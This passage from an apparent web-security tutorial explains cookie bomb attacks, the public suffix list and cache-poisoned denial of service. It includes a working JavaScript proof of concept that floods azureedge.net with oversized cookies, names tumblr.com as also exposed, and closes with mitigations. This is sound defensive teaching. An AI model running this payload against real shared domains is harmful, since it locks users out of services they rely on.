own subdomain, containing JavaScript code to set cookies. Then, if I send this page to anyone and they click on it, they won&#x27;t be able to access any <code>*.github.io</code> resources because they will be rejected by the server.</p><p>This hypothesis seems valid, but there is a prerequisite that must be met: &quot;Users can set cookies on <code>*.github.io</code> for <code>github.io</code>.&quot; If this prerequisite is not met, the cookie bomb cannot be executed.</p><p>In fact, there are many requirements like &quot;not allowing the upper-level domain to be affected by cookie settings.&quot; For example, if <code>a.com.tw</code> can set cookies for <code>.com.tw</code> or <code>.tw</code>, wouldn&#x27;t a lot of unrelated websites share cookies? This is clearly unreasonable.</p><p>Or consider the website of the Presidential Office, <code>https://www.president.gov.tw</code>. It should not be affected by the website of the Ministry of Finance, <code>https://www.mof.gov.tw</code>. Therefore, <code>.gov.tw</code> should also be a domain where cookies cannot be set.</p><p>I don&#x27;t know if you still remember, but we have actually mentioned this concept when talking about origin and site.</p><p>When the browser determines whether it can set a cookie for a certain domain, it refers to a list called the <a href="https://publicsuffix.org/list/" target="_blank" rel="noopener noreferrer">public suffix list</a>. Domains that appear on this list cannot directly set cookies for their subdomains.</p><p>For example, the following domains are on this list:</p><ol><li>com.tw</li><li>gov.tw</li><li>github.io</li></ol><p>So, the example mentioned earlier is not valid because when I am on <code>userA.github.io</code>, I cannot set a cookie for <code>github.io</code>, so the cookie bomb attack cannot be executed.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="expanding-the-attack-surface">Expanding the Attack Surface<a href="#expanding-the-attack-surface" class="hash-link" aria-label="Direct link to Expanding the Attack Surface" title="Direct link to Expanding the Attack Surface">​</a></h2><p>There are two prerequisites for the success of the aforementioned attacks:</p><ol><li>Finding a place where arbitrary cookies can be set.</li><li>The target must click on the URL found in step one.</li></ol><p>To make the attack easier to succeed, we can consider the following regarding these two prerequisites:</p><ol><li>Is it possible to easily find this place?</li><li>Is it possible for the target to be compromised without clicking on a link?</li></ol><p>The second point can be achieved through a vulnerability called Cache Poisoning.</p><p>As the name suggests, this vulnerability involves contaminating the content in the cache. For example, many websites have caches, and different users may access the same cache. In this case, I can find a way to make the cache server store a corrupted response. This way, all other users will also receive the corrupted file and see the same error message.</p><p>In this way, the target can be compromised without clicking on any links, and the attack is expanded from one person to everyone.</p><p>This has a specific term called <a href="https://cpdos.org/" target="_blank" rel="noopener noreferrer">CPDoS (Cache Poisoned Denial of Service)</a>. Since it exploits the cache, it is not related to the cookie bomb anymore. You can even launch the attack directly from your own computer without using cookies.</p><p>Now let&#x27;s look at the first point: &quot;Is it possible to easily find this place?&quot;.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="finding-a-place-to-easily-set-cookies">Finding a Place to Easily Set Cookies<a href="#finding-a-place-to-easily-set-cookies" class="hash-link" aria-label="Direct link to Finding a Place to Easily Set Cookies" title="Direct link to Finding a Place to Easily Set Cookies">​</a></h2><p>Is there a place where we can easily set cookies to execute a cookie bomb? Yes, it is the shared subdomain mentioned earlier, such as <code>*.github.io</code>.</p><p>But aren&#x27;t these domains already in the public suffix list? They cannot set cookies.</p><p>Just find one that is not on the list!</p><p>However, this is not an easy task because you will find that most of the services you know are already registered. For example, GitHub, AmazonS3, Heroku, and Netlify, among others, are already on the list.</p><p>But I found one that is not on the list, and that is Azure CDN provided by Microsoft: azureedge.net</p><p>I don&#x27;t know why, but this domain does not belong to the public suffix, so if I create my own CDN, I can execute a cookie bomb.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="make-a-poc">Make a PoC<a href="#make-a-poc" class="hash-link" aria-label="Direct link to Make a PoC" title="Direct link to Make a PoC">​</a></h2><p>The code I used for the demo is as follows, referenced and modified from <a href="https://github.com/wrr/cookie-bomb/blob/master/bomb.html" target="_blank" rel="noopener noreferrer">here</a>:</p><div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> domain </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;azureedge.net&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> cookieCount </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> cookieLength </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> expireAfterMinute </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">setCookieBomb</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">setCookie</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">key</span><span class="token parameter punctuation" style="color:#393A34">,</span><span class="token parameter"> value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> expires </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token class-name">Date</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">+</span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token class-name">Date</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> expireAfterMinute </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">60</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">cookie</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> key </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> value </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;; path=/; domain=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> domain </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;; Secure; SameSite=None; expires=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> expires</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">toUTCString</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">setCookieBomb</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> value </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;Boring&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;_&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">repeat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">cookieLength</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword control-flow" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">cookieCount</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">setCookie</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;key&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Next, upload the file to Azure and set up the CDN.</p><p>After clicking on it, a bunch of junk cookies will be set on <code>azureedge.net</code>:</p><p><img loading="lazy" src="/beyond-xss/en/assets/images/26-02-ef26c2c17aefa466b4418451d3ea3eab.png" width="1157" height="599" class="img_ev3q"></p><p>After refreshing, you will find that the website is no longer accessible:</p><p><img loading="lazy" src="/beyond-xss/en/assets/images/26-03-6794c39c9c71964ee67f570b98a77299.png" width="1260" height="470" class="img_ev3q"></p><p>This means the cookie bomb was successful.</p><p>So, any resources placed on <code>azureedge.net</code> will be affected.</p><p>Actually, Azure CDN has the ability to use custom domains, so if you use a custom domain, you won&#x27;t be affected. However, some websites do not use custom domains and directly use <code>azureedge.net</code> as the URL.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="mitigation">Mitigation<a href="#mitigation" class="hash-link" aria-label="Direct link to Mitigation" title="Direct link to Mitigation">​</a></h2><p>The best mitigation is to use a custom domain instead of the default <code>azureedge.net</code>. This way, you won&#x27;t have the cookie bomb issue. But aside from custom domains, <code>azureedge.net</code> should be registered as a public suffix to truly solve the problem.</p><p>Apart from these two defense measures, there is another one you may not have thought of.</p><p>As frontend engineers, we usually include resources like this:</p><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">script</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">src</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">htps://test.azureedge.net/bundle.js</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token script"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Just add the <code>crossorigin</code> attribute:</p><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">script</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">src</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">htps://test.azureedge.net/bundle.js</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">crossorigin</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token script"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>You can avoid cookie bomb attacks by using the <code>crossorigin</code> attribute when making requests. By default, when sending a request, cookies are included. However, if you use the <code>crossorigin</code> attribute and make the request in a cross-origin manner, cookies will not be included by default. This prevents the occurrence of the &quot;header too large&quot; issue.</p><p>Just remember to adjust the settings on the CDN side as well. Make sure the server adds the <code>Access-Control-Allow-Origin</code> header to allow cross-origin resource requests.</p><p>I used to be confused about when to use the <code>crossorigin</code> attribute, but now I know one of the use cases. If you don&#x27;t want to include cookies in the request, you can add the <code>crossorigin</code> attribute.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="another-real-world-example">Another Real-world Example<a href="#another-real-world-example" class="hash-link" aria-label="Direct link to Another Real-world Example" title="Direct link to Another Real-world Example">​</a></h2><p>Tumblr, which was originally focused on a specific niche but later acquired by Automattic, has a special feature that allows users to customize CSS and JavaScript on their personal pages. The domain of these personal pages is in the format of userA.tumblr.com. Since tumblr.com is not registered under a public suffix, it is also vulnerable to cookie bomb attacks.</p><p>If you visit the following URL in Chrome or Edge and then refresh or go to the Tumblr homepage, you will notice that you cannot access it:</p><p><img loading="lazy" src="data:image/png;base64,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